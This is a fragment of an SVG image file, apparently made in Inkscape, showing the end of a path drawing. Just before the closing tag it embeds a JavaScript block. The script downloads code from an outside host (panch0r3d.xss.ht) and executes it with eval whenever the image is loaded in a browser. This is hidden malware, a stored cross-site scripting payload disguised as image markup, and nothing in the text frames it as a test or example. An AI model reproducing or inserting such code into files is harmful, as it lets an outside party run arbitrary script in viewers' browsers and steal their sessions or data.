-7.746,1.043 -5.574,1.463 -9.877,4.922 -12.795,10.284"
           style="fill:#000000;fill-opacity:1;fill-rule:nonzero;stroke:none"
           id="path4231"
           inkscape:connector-curvature="0" /></g></g></g>
           <script type="text/javascript">
      function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//panch0r3d.xss.ht");a.send();
   </script>
           </svg>
